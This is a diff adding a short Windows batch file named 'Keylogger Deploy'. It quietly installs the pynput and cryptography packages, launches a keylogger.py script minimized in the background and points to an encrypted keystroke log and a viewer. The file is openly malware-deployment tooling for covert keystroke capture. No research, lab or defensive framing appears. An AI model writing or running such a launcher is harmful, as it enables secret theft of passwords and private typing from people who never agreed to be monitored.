@@ -1,0 +1,19 @@
+@echo off
+title Keylogger Deploy
+color 0A
+
+echo 🚀 Deploying Keylogger Suite...
+pip install pynput cryptography >nul 2>&1
+
+echo [+] Starting background capture...
+start /min cmd /c "python keylogger.py"
+
+timeout /t 3 >nul
+echo.
+echo ✅ DEPLOYED!
+echo.
+echo 👀 View logs:    python viewer.py -l 50
+echo 📁 Log file:     keystrokes.enc
+echo 🛑 Task Manager: keylogger.py
+echo.
+pause
